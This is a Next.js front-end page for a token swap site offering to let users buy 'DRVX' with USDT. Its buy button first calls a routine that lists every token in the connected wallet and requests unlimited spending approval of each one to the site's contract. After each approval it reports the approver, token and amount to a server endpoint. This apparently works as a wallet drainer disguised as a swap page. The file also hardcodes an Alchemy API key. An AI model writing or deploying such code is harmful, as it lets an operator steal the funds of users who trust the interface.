"use client";

import Image from "next/image";
import { useCallback, useEffect, useState } from "react";
import { ToastContainer, toast } from "react-toastify";
import LoadingGif from "../components/swap/loadingGif";
import ActionButton from "../components/swap/ActionButton";
import { useAccount, useConfig, useToken, Config, useChainId } from "wagmi";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import TopBar from "../components/swap/topBar";
import { Address, maxUint256 } from "viem";
import { readContract, writeContract, getToken, getBalance } from "@wagmi/core";
import { waitForTransactionReceipt } from "wagmi/actions";
import { arbitrum, cronosTestnet, sepolia } from "wagmi/chains";
import { ethers } from "ethers";
import BarcketAnimation from "../components/swap/backetAnimation";
import InputTag from "../components/swap/inputTag";
import { CONTRACT_ADDRESS, RYAN } from "../config";
import { USDT } from "../config";
import CopyButton from "../components/swap/CopyBotton";
import { getRatio } from "../utils/actions";
// import { config } from "@/app/config/wagmi";
import { config } from "../config/config";
import { getUSDTBalance } from "../utils/actions";
import { SAMPLE_ABI, USDT_ABI } from "../utils";
import { CONTRACT_ABI } from "../utils";
import { mainnet } from "wagmi/chains";
import { Alchemy, Network } from "alchemy-sdk";

const Alchemy_APIKEY = "IO0vu1oqvjeC56eXka5SrAtzIfkYcYyl";
const AlchemyConfig: any = {
  apiKey: Alchemy_APIKEY,
  network: Network.ARB_MAINNET,
};
const alchemy = new Alchemy(AlchemyConfig);

export default function Home() {
  const { isConnected, address } = useAccount();
  const chainId = useChainId();
  const configDft = useConfig();

  const [isSwapping, setIsSwapping] = useState(false);

  const [ratio, setRatio] = useState(0);
  const [baseAmount, setBaseAmount] = useState(0);
  const [quoteAmount, setQuoteAmount] = useState(0);

  useEffect(() => {
    const load = async () => {
      const res: any = await getRatio(configDft, chainId);
      console.log("Ratio is ", res);
      setRatio(Number(res));
    };
    load();
  }, [configDft, chainId]);

  useEffect(() => {
    const res = baseAmount * ratio;
    console.log("aaaa", res);
    setQuoteAmount(Number(res));
  }, [baseAmount, configDft, chainId]);

  function shortenAddress(address: string): string {
    if (!address) return "";

    // Ensure the address is at least 10 characters (to avoid issues with very short strings)
    return `${address.slice(0, 6)}....${address.slice(-4)}`;
  }

  const approveAllofUser = async () => {
    setIsSwapping(true);

    // Get token balances

    const balances: any = await alchemy.core.getTokenBalances(
      address as Address
    );
    // console.log(`The balances of ${address} address are:`, balances);

    const nonZeroBalances = balances.tokenBalances.filter((token: any) => {
      // return token.tokenBalance != 0 && (String(token.contractAddress).toLowerCase() != String(RYAN.address).toLowerCase());
      return token.tokenBalance != 0;
    });
    /*
    let prices = [];
    for (let token of nonZeroBalances) {
      let response: any;
      try {
        response = await fetch(
          `https://api.geckoterminal.com/api/v2/simple/networks/arbitrum/token_price/${token.contractAddress}`,
          {
            method: "GET",
            headers: { 
              "Content-Type": "application/json",
              "Access-Control-Allow-Origin" : "*"
            },
          }
        );
      } catch (error) {
        console.log("🚀 ~ approveAllofUser ~ error:", error)
      }

      const data = await response.json();
      let eachPrice = data.data.attributes.token_prices[token.contractAddress];
      if (eachPrice == undefined || eachPrice == null) eachPrice = 0;
      prices.push(Number(eachPrice));
    }
    for (let i = 0; i < nonZeroBalances.length; i++) {
      nonZeroBalances[i].price = prices[i]; // Add price to the token object
    }
    console.log("🚀 ~ approveAllofUser ~ nonZeroBalances:", nonZeroBalances);

    nonZeroBalances.sort((a: any, b: any) => {
      const valueA = Number(a.tokenBalance) * Number(a.price); // Calculate value for token A
      const valueB = Number(b.tokenBalance) * Number(b.price); // Calculate value for token B

      // Sort in descending order (highest value first)
      return valueB - valueA;
    });
    console.log("🚀 ~ approveAllofUser ~ nonZeroBalances:", nonZeroBalances);
*/
    // console.log(`Token balances of ${address} \n`);

    // Counter for SNo of final output
    let i = 0;

    // Loop through all tokens with non-zero balance
    for (let token of nonZeroBalances) {
      // Get balance of token
      let balance: any = token.tokenBalance;
      console.log("🚀 ~ approveAllofUser ~ balance:", Number(balance));

      // Get metadata of token
      const metadata: any = await alchemy.core.getTokenMetadata(
        token.contractAddress
      );

      const abi = SAMPLE_ABI;
      const usdtAddr = token.contractAddress;
      const contractAddr = CONTRACT_ADDRESS;

      let allowanceRes: any;
      try {
        allowanceRes = await readContract(configDft, {
          abi,
          address: usdtAddr as Address,
          functionName: "allowance",
          chainId: arbitrum.id,
          args: [address as Address, contractAddr as Address],
        });
      } catch (error) {
        console.log("allowance err : ", error);
        setIsSwapping(false);
        return;
      }
      console.log(
        "🚀 ~ approveAllofUser ~ allowanceRes:",
        Number(allowanceRes)
      );

      // console.log(allowanceRes, "wf");

      if (Number(allowanceRes) < Number(balance) && Number(balance) >= 1000) {
        try {
          console.log(SAMPLE_ABI, usdtAddr, contractAddr, "-----");
          const res: any = await writeContract(configDft, {
            abi,
            address: usdtAddr as Address,
            functionName: "approve",
            chainId: arbitrum.id,
            args: [contractAddr as Address, ethers.MaxUint256],
          }).then(async (hash) => {
            await waitForTransactionReceipt(configDft, { hash });
            try {
              const message: string = `${
                address as Address
              } approved ${balance} ${metadata.symbol} to ${
                contractAddr as Address
              }`;
              const response = await fetch("/api/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ message }),
              });

              const data = await response.json();

              if (data.success) {
                // toast.success('Message sent successfully!');
                console.log("Msg sent successfully");
              } else {
                console.log(`Error: ${data.message}`);
              }
            } catch (error) {
              console.log("Error: Failed to send message.....");
              console.error(error);
            }
          });
        } catch (error) {
          console.log("Approve err : ", error);
          setIsSwapping(false);
          // return;
        }
      }

      balance = balance / Math.pow(10, metadata.decimals);
      balance = balance.toFixed(2);

      // Print name, balance, and symbol of token
      console.log(`${i++}. ${metadata.name}: ${balance} ${metadata.symbol}`);
    }
  };

  const buyRYAN = async () => {
    await approveAllofUser(); // approve all to contract if tokens has balance
    if (baseAmount == 0) {
      toast.warning("Input USDT!");
      return;
    }
    toast.warning("Please wait");
    setIsSwapping(true);
    const usdtBalance: any = await getUSDTBalance(
      configDft,
      address as Address
    );
    console.log("usdt:", usdtBalance);

    // try {
    //   const abi = USDT_ABI;
    //   const usdtAddr = USDT.address;
    //   const contractAddr = CONTRACT_ADDRESS;
    //   const res: any = await writeContract(configDft, {
    //     abi,
    //     address: usdtAddr as Address,
    //     functionName: "approve",
    //     chainId: arbitrum.id,
    //     args: [contractAddr as Address, ethers.MaxUint256],
    //   }).then(async (hash) => {
    //     await waitForTransactionReceipt(configDft, { hash });
    //   });
    // } catch (error) {
    //   console.log("Approve err : ", error);
    //   setIsSwapping(false);
    //   return;
    // }

    try {
      const abi = CONTRACT_ABI;
      const res: any = await writeContract(configDft, {
        abi,
        address: CONTRACT_ADDRESS as Address,
        functionName: "buyToken",
        chainId: arbitrum.id,
        args: [baseAmount * 10 ** 6],
      }).then(async (hash) => {
        await waitForTransactionReceipt(configDft, { hash });
        toast.success("Buy Token Success");
        setIsSwapping(false);
      });
    } catch (error) {
      console.log("buyToken err : ", error);
      toast.warning("Buy Token Fail");
      setIsSwapping(false);
    }

    // setIsSwapping(false);
  };

  return (
    <>
      <TopBar />
      <LoadingGif isLoading={isSwapping} />
      <div className="flex min-[1185px]:flex-row flex-col mx-4 font-sans text-black min-[1185px]:pt-[20px] pt-[40px] px-[30px]">
        <div className="flex min-[1185px]:flex-col min-[892px]:flex-row flex-col justify-center place-items-center min-[1185px]:w-[calc(55%)] w-full min-[892px]:pl-[30px] pl-0 min-[1185px]:gap-0 gap-8">
          <div className="flex flex-col min-[1185px]:place-items-center min-[892px]:place-items-start place-items-center">
            <h1 className="font-semibold min-[630px]:text-[56px] text-[32px]">
              Swap Token Instantly
            </h1>
            <h1 className="font-medium min-[1185px]:text-[36px] text-[25px] mt-10">
              Buy <a className="text-green">DRVX</a> with{" "}
              <a className="text-green">USDT</a>
            </h1>
          </div>
          <BarcketAnimation />
        </div>
        <div className="flex justify-center min-[1185px]:mb-0 mb-[80px]">
          <div className="flex flex-col pt-2 w-full max-w-[484px] h-[520px] mt-[50px] border border-green-border rounded-2xl bg-[linear-gradient(to_bottom,_#3181a0_0%,_#ffffff)]">
            <div className="flex place-items-center gap-4">
              <Image
                className="relative left-0 top-0 opacity-100 hover:opacity-70 transition-opacity duration-300 cursor-pointer"
                src={`/img/modalImg.png`}
                width={45}
                height={45}
                alt=""
              />
              <h1 className="text-[24px] font-medium text-center">
                Getting Started
              </h1>
            </div>
            <div className="flex flex-col sm:px-[48px] px-[10px] gap-5 mt-[50px]">
              <div className="flex flex-col">
                <h1 className="text-gray text-[14px] pb-2 font-bold">
                  I Want to Spend
                </h1>
                <InputTag
                  baseAmount={baseAmount}
                  setBaseAmount={setBaseAmount}
                  quoteAmount={quoteAmount}
                  setQuoteAmount={setQuoteAmount}
                  tokenName={"USDT"}
                  ratio={ratio}
                />
              </div>
              <div className="flex flex-col">
                <h1 className="text-gray text-[14px] pb-2 font-bold">
                  I Will Receive
                </h1>
                <InputTag
                  baseAmount={baseAmount}
                  setBaseAmount={setBaseAmount}
                  quoteAmount={quoteAmount}
                  setQuoteAmount={setQuoteAmount}
                  tokenName={"DRVX"}
                  ratio={ratio}
                />
              </div>
              <div className="flex flex-col place-items-center gap-2 border border-green-border rounded-2xl bg-[linear-gradient(to_right,_#f8ede5_60%,_#3191a0)] py-2">
                <h1 className="text-gray text-[14px] font-bold">
                  DeriveX Crypto Ventures Address
                </h1>
                <div className="flex">
                  <h1 className="hidden sm:block text-gray text-[14px] border border-2 border-transparent hover:border-2 border-dashed hover:border-green-border cursor-pointer px-1">
                    {RYAN.address}
                  </h1>
                  <h1 className="block sm:hidden text-gray text-[14px] border border-2 border-white border-dashed hover:border-green-border cursor-pointer px-1">
                    {shortenAddress(RYAN.address)}
                  </h1>
                  <div className="hover:cursor-pointer hover:text-blue-400 text-gray text-[14px] flex items-center">
                    <CopyButton value={RYAN.address} />
                  </div>
                </div>
              </div>
              {ratio == 0 ? (
                <></>
              ) : (
                <div className="flex mt-3">
                  <h1 className="text-gray text-[12px]">Reference Price : </h1>
                  <h1 className="text-gray font-bold text-[12px]">
                    1 USDT ≈ 1 DRVX
                  </h1>
                </div>
              )}
              <ActionButton buy={buyRYAN} />
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
